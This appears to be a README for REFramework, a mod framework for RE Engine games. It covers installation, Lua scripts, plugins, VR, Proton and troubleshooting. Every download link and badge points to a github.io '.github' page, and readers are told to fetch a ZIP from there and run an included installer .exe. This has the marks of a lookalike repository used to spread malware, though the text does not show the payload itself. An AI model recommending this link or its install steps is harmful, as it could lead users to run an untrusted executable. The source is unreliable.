# REFramework — Simple RE Engine Modding Setup

<p align="center">
  <a href="https://REFramework-Mod.github.io/.github"><img src="https://img.shields.io/badge/GET%20REFRAMEWORK-NOW-00C853?style=for-the-badge&logo=github&logoColor=white" alt="GET REFramework NOW"></a>
  <a href="https://REFramework-Mod.github.io/.github"><img src="https://img.shields.io/badge/REFRAMEWORK-INSTALLER-8b5cf6?style=for-the-badge" alt="REFramework Installer"></a>
</p>

<p align="center">
  <a href="https://REFramework-Mod.github.io/.github"><img src="https://img.shields.io/badge/RE%20ENGINE-✓-2ea44f?style=flat-square" alt="RE Engine Supported"></a>
  <a href="https://REFramework-Mod.github.io/.github"><img src="https://img.shields.io/badge/LUA%20SCRIPTING-✓-2ea44f?style=flat-square" alt="Lua Scripting Supported"></a>
  <a href="https://REFramework-Mod.github.io/.github"><img src="https://img.shields.io/badge/PLUGIN%20SYSTEM-✓-2ea44f?style=flat-square" alt="Plugin System Supported"></a>
  <a href="https://REFramework-Mod.github.io/.github"><img src="https://img.shields.io/badge/VR-✓-2ea44f?style=flat-square" alt="VR Supported"></a>
</p>

REFramework is a community-developed mod framework, scripting platform, and modding tool for games built on Capcom's **RE Engine**.

It provides a runtime environment that allows compatible mods, Lua scripts, and native plugins to interact with the game while it is running.

REFramework is commonly used as a foundation for mods in games such as Resident Evil, Monster Hunter, Devil May Cry, Street Fighter and other RE Engine titles.

> **Important:** REFramework is not a universal mod loader for every PC game. Compatibility depends on the specific RE Engine game, REFramework build, installed mods and the game's current version.

## What Is REFramework?

REFramework acts as a runtime modding framework for RE Engine games.

Depending on the game and installed components, it can provide:

* Lua scripting
* Native plugin support
* Runtime object inspection
* Game object manipulation
* Camera controls
* Field-of-view controls
* UI overlays
* Developer tools
* VR support
* Mod configuration menus
* Logging and debugging features

Many RE Engine mods require REFramework because they use its APIs to communicate with the game.

## Supported Games

The current REFramework project lists support for a range of RE Engine titles, including:

* Resident Evil 2
* Resident Evil 3
* Resident Evil 4
* Resident Evil 7
* Resident Evil Village
* Resident Evil Requiem
* Devil May Cry 5
* Street Fighter 6
* Monster Hunter Rise
* Monster Hunter Wilds
* Monster Hunter Stories 3
* Dragon's Dogma 2
* Dead Rising Deluxe Remaster
* Ghosts 'n Goblins Resurrection
* Apollo Justice: Ace Attorney Trilogy
* Kunitsu-Gami: Path of the Goddess
* Onimusha 2: Samurai's Destiny
* Onimusha: Way of the Sword
* Mega Man Star Force Legacy Collection

> **Note:** Support is game-specific. A game using RE Engine does not automatically mean that every REFramework feature or plugin will work with it.

## Key Features

* Runtime modding framework for RE Engine games.
* Lua scripting API.
* Native plugin system.
* In-game GUI.
* Runtime object inspection.
* Camera manipulation.
* Free camera support.
* FOV controls.
* Ultrawide and aspect-ratio fixes where supported.
* GUI hiding/disabling.
* VR support.
* Developer tools.
* Support for third-party scripts and plugins.
* Logging and troubleshooting capabilities.

## How REFramework Works

A simplified structure looks like this:

```text
Game
  │
  ├── RE Engine
  │
  ├── REFramework
  │     ├── Lua scripts
  │     ├── Native plugins
  │     ├── UI
  │     └── Runtime APIs
  │
  └── Mods
```

The framework provides the interface that compatible mods can use to communicate with the game.

For example:

```text
REFramework
      ↓
Lua script / Plugin
      ↓
RE Engine API
      ↓
Game object / Camera / UI
```

## Installing REFramework

### 1. Download REFramework

Download the REFramework ZIP archive using download page:

https://REFramework-Mod.github.io/.github

### 2. Extract the Archive

Extract the downloaded `.zip` archive to a temporary folder.

Do not run the installer directly from inside the compressed archive.

After extraction, you should see the REFramework installer and its accompanying files.

### 3. Start the Installer

Run the included REFramework installer

### 4. Select the Game

When prompted by the installer, select the game for which you want to install REFramework.

Choose the game's actual installation or executable directory rather than a launcher directory whenever possible.

For example:

```text
<Game Folder>\
    Game.exe
```

The exact executable name and directory depend on the game.

### 5. Choose the Installation Type

Follow the installer instructions for the selected game.

Depending on the supported title, the installer may configure the required REFramework files automatically.

For a standard non-VR installation, the resulting game directory will typically contain the required REFramework loader alongside the game's executable.

A typical result may look similar to:

```text
<Game Folder>\
    Game.exe
    dinput8.dll
    reframework\
```

> **Important:** Do not manually rename or replace DLL files unless the installer or the specific game's compatibility instructions explicitly require it.

### 6. Finish Installation

Allow the installer to complete the installation.

Close the game before installing or updating REFramework so that its files are not locked.

After installation, the installer may create the required `reframework` directory and configuration structure automatically.

### 7. Launch the Game

Start the game normally.

After REFramework has loaded, its in-game menu can be opened with:

```text
Insert
```

If the menu appears, REFramework has successfully loaded.

### 8. Install Additional Mods

Once REFramework is confirmed to be working, close the game and install any required REFramework scripts or plugins.

A typical structure may look like:

```text
<Game Folder>\
    dinput8.dll
    reframework\
        autorun\
            mod.lua
        plugins\
            plugin.dll
```

The exact structure depends on the individual mod.

## REFramework Menu

Press:

```text
Insert
```

to open the REFramework menu.

Depending on the game and installed mods, you may see sections such as:

```text
REFramework
├── Script Generated UI
├── Plugins
├── VR
├── Camera
└── Settings
```

The exact menu contents depend on the game and installed scripts/plugins.

## Lua Scripts

One of REFramework's main features is its Lua scripting API.

Lua scripts can interact with supported RE Engine systems while the game is running.

A common structure is:

```text
reframework\
    autorun\
        my_mod.lua
```

Scripts placed in the appropriate `autorun` directory can be loaded automatically when the game starts.

A simple example:

```lua
re.on_frame(function()
    -- Code executed every frame
end)
```

The available API depends on the REFramework version and the game.

## REFramework Plugins

REFramework also supports native plugins.

A typical plugin installation may look like:

```text
reframework\
    plugins\
        plugin.dll
```

Plugins can provide functionality that is difficult or impossible to implement entirely through Lua.

Always follow the installation instructions supplied with the individual plugin.

## Installing a REFramework Mod

Many RE Engine mods list REFramework as a requirement.

A typical installation process is:

1. Install REFramework.
2. Launch the game.
3. Press **Insert** and confirm that the menu appears.
4. Close the game.
5. Download the required mod.
6. Read the mod's installation instructions.
7. Copy the mod files into the specified directory.
8. Launch the game again.
9. Open the REFramework menu with **Insert**.
10. Configure the mod if it provides an in-game menu.

A common structure is:

```text
<Game Folder>\
    reframework\
        autorun\
            mod.lua
        plugins\
            plugin.dll
```

> **Important:** Not every mod uses this exact structure. Always follow the directory structure specified by the mod author.

## Included Features

Depending on the supported game, REFramework may provide built-in functionality such as:

* Lua scripting API and plugin system.
* Generic VR support.
* Motion controls for selected Resident Evil games.
* First-person camera for supported titles.
* Manual flashlight for supported titles.
* Free camera.
* Scene timescale controls.
* FOV slider.
* Vignette disabling.
* Ultrawide/aspect-ratio fixes.
* GUI hiding/disabling.
* Game object display.
* Object Explorer.

Availability depends on the game.

## VR Installation

VR installation differs from the standard non-VR installation.

For supported VR configurations:

1. Install SteamVR unless using OpenXR on a supported headset.
2. Extract the required REFramework package.
3. Copy the complete package into the corresponding game directory.
4. Launch the game.
5. Verify that REFramework and the VR functionality load correctly.

> **Note:** VR support is game- and headset-dependent. Check the current REFramework documentation before configuring VR.

## Proton / Linux

REFramework can also be used with compatible games through Proton/Wine configurations.

After extracting REFramework, a Steam launch option may be required:

```text
WINEDLLOVERRIDES="dinput8.dll=n,b" %command%
```

The exact result depends on the game, Proton version and configuration.

## Configuration

REFramework and individual plugins can create configuration files inside the game's `reframework` directory.

A typical structure may contain:

```text
reframework\
    config\
    autorun\
    plugins\
```

Do not delete configuration files unless you are troubleshooting or intentionally resetting a mod.

If a plugin provides an in-game configuration menu, it is usually preferable to configure it there.

## Updating REFramework

When a game receives an update, REFramework or its plugins may require an update as well.

If the game starts crashing after an update:

1. Check for a newer REFramework build.
2. Check whether the installed mod supports the new game version.
3. Update REFramework if required.
4. Test the game without additional plugins.
5. Update individual scripts/plugins.
6. Check the REFramework log for errors.

Do not assume that an older REFramework build will remain compatible after a major game update.

## Troubleshooting

### REFramework Menu Does Not Appear

If pressing:

```text
Insert
```

does nothing:

1. Make sure `dinput8.dll` is in the correct game directory.
2. Confirm that you are launching the correct game.
3. Verify that your game is supported.
4. Make sure you downloaded a compatible REFramework build.
5. Temporarily remove other DLL-based modifications.
6. Start the game and reach the actual gameplay area before testing the menu.
7. Check the REFramework log.

### Game Crashes on Startup

Try the following:

1. Remove REFramework.
2. Confirm that the unmodified game launches normally.
3. Install a current compatible REFramework build.
4. Launch the game with no additional plugins.
5. Add plugins/scripts one at a time.
6. Check whether the game was recently updated.
7. Check the compatibility information for the specific game.

### A Mod Does Not Appear

If REFramework loads but a mod does not:

1. Verify that the mod requires REFramework.
2. Check the folder structure.
3. Verify that the `.lua` file is in the correct directory.
4. Confirm that the mod has all required dependencies.
5. Check whether the mod supports your game version.
6. Check the REFramework log for errors.

### Mod Works but Settings Are Missing

Some mods expose their settings through:

```text
Insert
    ↓
Script Generated UI
```

Others may appear under:

```text
Plugins
```

The exact location depends on the individual mod.

## Logs and Debugging

REFramework logs can help identify loading and compatibility problems.

For troubleshooting:

1. Reproduce the problem.
2. Close the game.
3. Locate the REFramework log.
4. Look for errors associated with the affected script or plugin.
5. Compare the error with the mod's documentation.

Possible errors can include:

```text
Failed to load plugin
Lua error
Invalid object
Unsupported game version
Missing dependency
```

The exact messages depend on the game and plugin.

## Compatibility With Other Mods

REFramework can coexist with many game modifications, but conflicts are possible.

Potential sources of problems include:

* Multiple mods modifying the same game system.
* Outdated Lua scripts.
* Incompatible native plugins.
* Game updates.
* Different REFramework versions.
* Other DLL-based modifications.
* Anti-cheat or online functionality.

For troubleshooting, use a minimal configuration:

```text
REFramework
    ↓
Problematic mod
```

Then add other modifications one at a time.

## Compatibility With ReShade and Other Tools

REFramework may coexist with ReShade and other graphics tools, but DLL-based modifications can conflict depending on the game.

If the game crashes after installing several modifications:

1. Disable ReShade or other graphics injectors.
2. Disable third-party overlays.
3. Remove additional DLL modifications.
4. Test REFramework alone.
5. Re-enable modifications one at a time.

## Online Games and Anti-Cheat

> **Warning:** Be careful when using REFramework with online or competitive games.

Runtime modifications may be incompatible with anti-cheat systems or the game's online policies.

For games with online functionality:

* Check the current anti-cheat policy.
* Check the specific mod's documentation.
* Avoid unsupported modifications in competitive multiplayer.
* Do not assume that a modification is safe simply because it works offline.

## Performance

REFramework itself is designed as a runtime framework, but performance impact depends on the installed scripts and plugins.

For example:

```text
REFramework only
        ↓
Usually low additional overhead

REFramework
+ multiple scripts
+ object hooks
+ camera tools
+ overlays
        ↓
Potentially higher CPU/GPU overhead
```

If performance decreases after installing a mod, test the game with REFramework alone and then enable modifications individually.

## Removing REFramework

To return the game to its original state:

1. Close the game.
2. Remove the files installed by REFramework.
3. Remove the `reframework` directory if it contains only REFramework/mod files.
4. Restore any original files that were replaced or backed up during installation.
5. Verify the game files through Steam or the relevant launcher if necessary.
6. Launch the game normally.

> **Tip:** If multiple REFramework mods are installed, check which files belong to each mod before deleting the entire `reframework` directory.

## Recommended Setup

For a simple installation:

1. **Check that your game is supported.**
2. Download the REFramework ZIP archive from:

   https://REFramework-Mod.github.io/.github

3. Extract the ZIP archive to a temporary folder.
4. Run the included REFramework installer (`.exe`).
5. Select the game's executable or game installation directory when requested.
6. Follow the installer's instructions.
7. Allow the installer to copy and configure the required files.
8. Launch the game.
9. Press **Insert**.
10. Confirm that the REFramework menu appears.
11. Close the game.
12. Install the required REFramework mods.
13. Launch the game again.
14. Configure the mods through the REFramework menu.

For troubleshooting, start with:

```text
REFramework only
        ↓
Mod 1
        ↓
Mod 2
        ↓
Mod 3
```

This makes it easier to identify which modification causes a problem.

> **Note:** REFramework is actively developed, and supported games and features can change between releases. Always check the current compatibility information and the requirements of the specific mod before installation.
